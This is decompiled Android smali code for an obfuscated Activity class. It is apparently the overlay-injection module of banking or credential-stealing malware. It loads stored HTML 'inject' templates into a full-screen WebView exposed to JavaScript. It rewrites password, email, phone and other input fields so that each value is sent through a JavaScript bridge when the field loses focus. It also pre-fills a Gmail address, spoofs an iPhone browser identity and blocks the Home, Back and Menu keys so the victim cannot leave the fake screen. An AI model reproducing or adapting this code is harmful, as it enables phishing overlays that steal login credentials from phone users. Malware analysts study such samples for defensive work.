.class public Lcom/beginhigh19/p016j;
.super Landroid/app/Activity;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/beginhigh19/p016j$for;,
        Lcom/beginhigh19/p016j$new;,
        Lcom/beginhigh19/p016j$ifdf;
    }
.end annotation


# instance fields
.field private case:Z

.field private else:Landroid/webkit/WebView;

.field private fddo:Ljava/lang/String;

.field private for:Ljava/lang/String;

.field private goto:[Ljava/lang/String;

.field private ifdf:Ljava/lang/String;

.field private new:Landroid/content/Context;

.field private try:Z


# direct methods
.method public constructor <init>()V
    .locals 11

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const-string v0, ""

    iput-object v0, p0, Lcom/beginhigh19/p016j;->fddo:Ljava/lang/String;

    iput-object v0, p0, Lcom/beginhigh19/p016j;->ifdf:Ljava/lang/String;

    const-string v0, ":CLOSE_ON:"

    iput-object v0, p0, Lcom/beginhigh19/p016j;->for:Ljava/lang/String;

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/beginhigh19/p016j;->try:Z

    iput-boolean v0, p0, Lcom/beginhigh19/p016j;->case:Z

    const-string v1, "email"

    const-string v2, "month"

    const-string v3, "number"

    const-string v4, "password"

    const-string v5, "search"

    const-string v6, "tel"

    const-string v7, "text"

    const-string v8, "time"

    const-string v9, "url"

    const-string v10, "week"

    filled-new-array/range {v1 .. v10}, [Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/beginhigh19/p016j;->goto:[Ljava/lang/String;

    return-void
.end method

.method private synthetic case()V
    .locals 3

    const/4 v0, 0x0

    :goto_0
    const/4 v1, 0x3

    if-ge v0, v1, :cond_2

    const-wide/16 v1, 0x3e8

    invoke-static {v1, v2}, Lfddo/goto;->p(J)V

    iget-boolean v1, p0, Lcom/beginhigh19/p016j;->case:Z

    if-eqz v1, :cond_0

    goto :goto_1

    :cond_0
    const/4 v1, 0x2

    if-ne v0, v1, :cond_1

    invoke-virtual {p0}, Lcom/beginhigh19/p016j;->try()V

    goto :goto_1

    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_2
    :goto_1
    return-void
.end method

.method private else(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 6

    const-string v0, "url"

    invoke-virtual {p3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p3

    if-eqz p3, :cond_0

    return-object p2

    :cond_0
    iget-object p3, p0, Lcom/beginhigh19/p016j;->goto:[Ljava/lang/String;

    array-length v0, p3

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_1

    aget-object v2, p3, v1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "type=\""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "\" "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "\" onblur=\"Android.on_blur_send(this.name,this.value)\" "

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p2, v3, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_1
    iget-object p3, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    invoke-static {p3}, Lfddo/goto;->throws(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p3

    const-string v0, "%LANG%"

    invoke-virtual {p2, v0, p3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    invoke-static {}, Lfddo/goto;->grethwjrsfhj()Z

    move-result p3

    const-string v0, "true"

    const-string v1, "false"

    if-eqz p3, :cond_2

    move-object p3, v0

    goto :goto_1

    :cond_2
    move-object p3, v1

    :goto_1
    const-string v2, "%IS_XIAOMI%"

    invoke-virtual {p2, v2, p3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    invoke-static {}, Lfddo/goto;->adgpkhmdsapfghmaepfmdhgpasdm()Z

    move-result p3

    if-eqz p3, :cond_3

    goto :goto_2

    :cond_3
    move-object v0, v1

    :goto_2
    const-string p3, "%IS_SAMSUNG%"

    invoke-virtual {p2, p3, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    iget-object p3, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    invoke-static {p3}, Lfddo/goto;->super(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p3

    const-string v0, "%APP_TITLE%"

    invoke-virtual {p2, v0, p3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    iget-object p3, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    invoke-static {p3}, Lfddo/goto;->throws(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p3

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "var lang = \'"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "\'"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "var lang = \'en\'"

    invoke-virtual {p2, v1, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "<html lang=\""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, "\">"

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    const-string v0, "<html lang=\"en\">"

    invoke-virtual {p2, v0, p3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    const-string p3, "gmail"

    invoke-virtual {p1, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p3

    if-eqz p3, :cond_6

    iget-object p1, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    const-string p3, "gmail_login"

    const-string v0, ""

    invoke-static {p1, p3, v0}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_5

    iget-object p1, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    invoke-static {p1}, Lfddo/goto;->public(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_4

    iget-object v0, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    invoke-static {v0, p3, p1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_4
    const-string p3, "class=\"svgavatar\""

    const-string v0, "class=\"svgavatar\" style=\"display: none\""

    invoke-virtual {p2, p3, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    :cond_5
    const-string p3, "%gmail_to_device%"

    invoke-virtual {p2, p3, p1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    goto :goto_3

    :cond_6
    const-string p3, "pattern"

    invoke-virtual {p1, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    :goto_3
    return-object p2
.end method

.method public static synthetic fddo(Lcom/beginhigh19/p016j;)V
    .locals 0

    invoke-direct {p0}, Lcom/beginhigh19/p016j;->case()V

    return-void
.end method

.method static synthetic for(Lcom/beginhigh19/p016j;)Landroid/content/Context;
    .locals 0

    iget-object p0, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    return-object p0
.end method

.method private goto(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 8

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    const/high16 v0, 0x1000000

    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V

    new-instance p1, Landroid/webkit/WebView;

    invoke-direct {p1, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object p1, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    const/4 v0, 0x4

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setVisibility(I)V

    iget-object p1, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const/4 v0, 0x1

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object p1, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    iget-object p1, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    new-instance v2, Lcom/beginhigh19/p016j$new;

    const/4 v3, 0x0

    invoke-direct {v2, p0, v3}, Lcom/beginhigh19/p016j$new;-><init>(Lcom/beginhigh19/p016j;Lcom/beginhigh19/p016j$fddo;)V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    iget-object p1, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    new-instance v2, Lcom/beginhigh19/p016j$for;

    invoke-direct {v2, p0, v3}, Lcom/beginhigh19/p016j$for;-><init>(Lcom/beginhigh19/p016j;Lcom/beginhigh19/p016j$fddo;)V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    iget-object p1, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    new-instance v2, Lcom/beginhigh19/p016j$ifdf;

    invoke-direct {v2, p0, p0}, Lcom/beginhigh19/p016j$ifdf;-><init>(Lcom/beginhigh19/p016j;Landroid/content/Context;)V

    const-string v3, "Android"

    invoke-virtual {p1, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/webkit/CookieManager;->setAcceptCookie(Z)V

    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object p1

    iget-object v2, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    invoke-virtual {p1, v2, v0}, Landroid/webkit/CookieManager;->setAcceptThirdPartyCookies(Landroid/webkit/WebView;Z)V

    iget-object p1, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    const-string v2, "Mozilla/5.0 (iPhone android; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1"

    invoke-virtual {p1, v2}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    const/4 v2, -0x1

    invoke-virtual {p1, v2}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setAppCacheEnabled(Z)V

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    const-string p1, "url"

    invoke-virtual {p3, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    invoke-virtual {p1, p2}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    iget-object v2, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    const/4 v3, 0x0

    const/4 v7, 0x0

    const-string v5, "text/html"

    const-string v6, "UTF-8"

    move-object v4, p2

    invoke-virtual/range {v2 .. v7}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :goto_0
    iget-object p1, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    invoke-virtual {p0, p1}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->setFinishOnTouchOutside(Z)V

    return-void
.end method

.method static synthetic ifdf(Lcom/beginhigh19/p016j;)Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/beginhigh19/p016j;->fddo:Ljava/lang/String;

    return-object p0
.end method

.method static synthetic new(Lcom/beginhigh19/p016j;)Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/beginhigh19/p016j;->ifdf:Ljava/lang/String;

    return-object p0
.end method

.method private this()V
    .locals 8

    const-string v0, "show_cap"

    iget-object v1, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "smarts_attempts"

    invoke-static {v1, v4, v3}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    iget-boolean v1, p0, Lcom/beginhigh19/p016j;->try:Z

    if-eqz v1, :cond_0

    return-void

    :cond_0
    const/4 v1, 0x1

    iput-boolean v1, p0, Lcom/beginhigh19/p016j;->case:Z

    iget-object v3, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    const-string v4, "smart_inject"

    const-string v5, ""

    invoke-static {v3, v4, v5}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_1

    return-void

    :cond_1
    iget-object v4, p0, Lcom/beginhigh19/p016j;->fddo:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    return-void

    :cond_2
    iput-object v3, p0, Lcom/beginhigh19/p016j;->fddo:Ljava/lang/String;

    iget-object v4, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "inj_"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v4, v6, v5}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    :try_start_0
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5, v4}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v4, "type"

    invoke-virtual {v5, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v6, "data"

    invoke-virtual {v5, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_3

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_3

    const-string v0, "cap_data"

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    :cond_3
    const-string v0, "url"

    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/beginhigh19/p016j;->for:Ljava/lang/String;

    invoke-virtual {v6, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/beginhigh19/p016j;->for:Ljava/lang/String;

    const/4 v5, 0x2

    invoke-virtual {v6, v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object v0

    aget-object v6, v0, v2

    aget-object v0, v0, v1

    iput-object v0, p0, Lcom/beginhigh19/p016j;->ifdf:Ljava/lang/String;

    :cond_4
    invoke-direct {p0, v3, v6, v4}, Lcom/beginhigh19/p016j;->else(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/beginhigh19/p016j;->fddo:Ljava/lang/String;

    invoke-direct {p0, v1, v0, v4}, Lcom/beginhigh19/p016j;->goto(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "BOTLOG: Inject "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/beginhigh19/p016j;->fddo:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " started"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lfddo/goto;->rsjsadghfsfdghj(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    const-string v2, "EXC_SMARTACT_START"

    invoke-static {v1, v2, v0}, Lfddo/goto;->class(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Exception;)V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    iput-object p1, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    return-void
.end method

.method protected onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 v0, 0x3

    if-eq p1, v0, :cond_0

    const/4 v0, 0x4

    if-eq p1, v0, :cond_0

    const/16 v0, 0x52

    if-eq p1, v0, :cond_0

    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result p1

    return p1

    :cond_0
    const/4 p1, 0x1

    return p1
.end method

.method protected onPause()V
    .locals 2

    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    iget-object v0, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    const/4 v1, 0x4

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setVisibility(I)V

    :cond_0
    return-void
.end method

.method protected onRestart()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onRestart()V

    return-void
.end method

.method protected onResume()V
    .locals 2

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    iget-object v0, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setVisibility(I)V

    :cond_0
    return-void
.end method

.method protected onStart()V
    .locals 3

    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    :try_start_0
    invoke-direct {p0}, Lcom/beginhigh19/p016j;->this()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    const-string v2, "EXC_SMARTACT"

    invoke-static {v1, v2, v0}, Lfddo/goto;->class(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    return-void
.end method

.method protected onStop()V
    .locals 2

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/beginhigh19/p016j;->case:Z

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lfddo/final;

    invoke-direct {v1, p0}, Lfddo/final;-><init>(Lcom/beginhigh19/p016j;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method protected try()V
    .locals 3

    iget-object v0, p0, Lcom/beginhigh19/p016j;->new:Landroid/content/Context;

    const-string v1, "smart_inject"

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/beginhigh19/p016j;->try:Z

    iget-object v0, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/webkit/WebView;->removeAllViewsInLayout()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/beginhigh19/p016j;->else:Landroid/webkit/WebView;

    :cond_0
    invoke-static {}, Ljava/lang/System;->gc()V

    invoke-virtual {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    return-void
.end method
